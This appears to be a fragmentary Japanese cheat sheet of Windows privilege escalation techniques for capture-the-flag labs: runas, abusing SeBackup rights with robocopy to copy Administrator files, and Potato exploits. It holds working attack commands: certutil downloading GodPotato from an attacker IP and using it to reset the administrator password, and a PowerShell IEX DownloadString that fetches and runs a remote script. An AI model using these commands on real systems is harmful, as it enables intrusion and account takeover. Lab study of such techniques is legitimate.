...
コマンドプロンプトを開けている状態でパスワードが分かっている他のユーザーに昇格したいとき

```sh
runas /user:<domain>\<name> cmd.exe
```
...
バッチファイルを上書きできる権限があっても、スケジュールを見る権限はないということもあるので、ファイルから探すのは有効。
...
DCではローカルAdministratorが無効にされていて、ハッシュを使っても認証できない場合がある。SeBackup権限があれば任意のファイルを直接コピーできる。

```ps
robocopy "C:\Users\Administrator\Desktop" "C:\Users\Public" flag.txt /B
...
https://github.com/zcgonvh/EfsPotato (csファイルをターゲット上でコンパイルする。古いDefender定義なら回避できる可能性もある)

```sh
certutil -URLcache -split -f http://10.13.85.243:8000/GodPotato-NET4.exe pt.exe

.\pt.exe -cmd "cmd /c whoami"

.\pt.exe "cmd.exe /C net user administrator Password1234!"
```
...
IEX(New-Object System.Net.WebClient).DownloadString('http://10.11.72.22:445/EnableAllTokenPrivs.ps1');
